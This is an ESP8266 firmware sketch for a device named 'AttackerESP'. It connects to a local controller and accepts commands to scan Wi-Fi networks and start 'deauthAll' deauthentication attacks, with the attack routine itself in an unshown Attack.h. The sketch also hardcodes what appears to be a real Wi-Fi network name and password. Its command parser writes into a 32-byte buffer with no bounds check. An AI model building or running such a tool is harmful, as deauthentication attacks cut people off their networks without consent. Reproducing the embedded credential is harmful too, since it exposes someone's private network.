#include <ESP8266WiFi.h>
#include "Command.h"
#include "Attack.h"
extern "C" {
  #include "user_interface.h"
}

WiFiClient client;
Command command;
Attack attack;

bool inprogress = false;
bool newData = false;

struct deviceInfo {
  char address[16] = "\"AttackerESP\"";
  char type[16] = "\"attacker\"";
  char info[64];
  char data[32];
};

deviceInfo esp;

void setup() {
  Serial.begin(115200);
  pinMode(2, OUTPUT);
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  WiFi.begin("Formigao 2.4Ghz", "VhgpMhgp!!07@)05");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
  }
  Serial.println("<ESP8266 STARTED>");
  attack.scan();
}

void loop() {
  if (!client.connected()){
    connectToHost();
  }

  if (client.available() > 0) {
    recvCmd();
  }

  attack.updateAttack();
}

void sendDvcInfo() {
  memset(esp.info, 0, sizeof(esp.info));
  strcat(esp.info, "{\"address\":");
  strcat(esp.info, esp.address);
  strcat(esp.info, ",\"type\":");
  strcat(esp.info, esp.type);
  strcat(esp.info, "}");
  client.print(esp.info);
}

void connectToHost() {
  if (!client.connect("192.168.0.8", 1107)) {
    delay(5000);
    return;
  } else {
    Serial.println("<ESP Connected>");
    sendDvcInfo();
  }
}

void recvCmd() {
  byte i;
  while(client.available() > 0){
    char c = client.read();
    if (c == '{'){
      i = 0;
      esp.data[0] = '\0';
      inprogress = true;
    } else if (c == '}') {
      inprogress = false;
      newData = true;
      esp.data[i] = '\0';
      break;
    } else if (inprogress) {
      esp.data[i] = c;
      i++;
    }
  }
  if (newData) {
    if (!strcmp(esp.data, "scanNetworks")) {
      Serial.println("<Scanning for networks>");
      attack.scan();
    } else if (!strcmp(esp.data, "deauthAll")) {
      Serial.println("<MODE = 0x02>");
      attack.mode = 0x02;
    } else if (!strcmp(esp.data, "attackStart")) {
      attack.start();
    } else if (!strcmp(esp.data, "attackStop")) {
      attack.stop();
    } else if (!strcmp(esp.data, "attackStop")) {
      attack.stop();
    } else if (command.subchar(0, 6, esp.data, "attack")) {
      Serial.print('<');
      Serial.print(command.split('[', ']', esp.data));
      Serial.print('>');
    }
    newData = false;
  }
}
